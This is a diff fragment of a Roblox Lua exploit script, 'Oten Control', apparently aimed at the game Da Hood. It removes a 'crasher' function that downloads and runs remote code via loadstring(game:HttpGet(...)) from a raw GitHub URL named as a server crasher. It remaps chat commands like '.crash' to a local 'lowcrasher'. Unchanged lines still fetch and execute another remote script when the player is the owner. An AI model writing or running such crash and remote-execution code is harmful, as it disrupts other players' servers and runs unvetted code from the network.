@@ -121,9 +121,6 @@ end
 
 -- CRASHER
 
-local function crasher()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-end
 local function lowcrasher()
 
 
@@ -446,12 +443,7 @@ plr.Chatted:Connect(function(msg)
 
 
 
-	if msg == ".crash" then
-		crasher()
-		noti('Swagcrash is now running thank you for using Oten Control ' ..me)
-	end
-
-	if msg == ".lowcrash" or msg == ".crash2" then
+	if msg == ".crash" or msg == ".lowcrash" or msg == ".crash2" then
 		lowcrasher()
 		noti('Swagcrash is now running thank you for using Oten Control ' ..me)
 	end
@@ -489,4 +481,3 @@ if me == owner then
 	loadstring(game:HttpGet"https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter")()-- JOIN / LEAVE NOTIFY
 end   
 -- NOTIFICATION / INTRO
-
